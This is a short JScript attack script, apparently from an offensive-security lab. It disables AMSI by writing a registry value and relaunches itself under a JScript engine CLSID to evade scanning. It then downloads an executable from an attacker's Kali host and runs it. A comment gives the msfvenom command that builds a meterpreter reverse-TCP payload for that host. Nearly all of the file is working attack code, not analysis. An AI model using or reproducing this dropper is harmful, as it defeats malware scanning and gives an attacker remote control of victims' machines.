// This shell is used to read the registry key
var sh = new ActiveXObject('WScript.Shell');

// Full registry path can be derived using Frida + reverse engineering
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";

// Try to read the registry value -> if value != 0, then AMSI is enabled
try{
	var AmsiEnable = sh.RegRead(key);
	if(AmsiEnable!=0){
	throw new Error(1, '');
	}
}catch(e){
// If AMSI is enabled, disable it temporarily
	sh.RegWrite(key, 0, "REG_DWORD");

// CLSID here corresponds to the Jscript engine
	sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1);

// Restore AMSI to enabled upon finishing the program
	sh.RegWrite(key, 1, "REG_DWORD");
	WScript.Quit(1);
}

var url = "http://192.168.KALI.IP/poop.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');
Object.Open('GET', url, false);
Object.Send();
if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');
    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;
    Stream.SaveToFile("poop.exe", 2);
    Stream.Close();
}
var r = new ActiveXObject("WScript.Shell").Run("poop.exe");

// Note: Need to host payload on Kali web server
// Generate payload using: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.KALI.IP LPORT=443 -o poop.exe

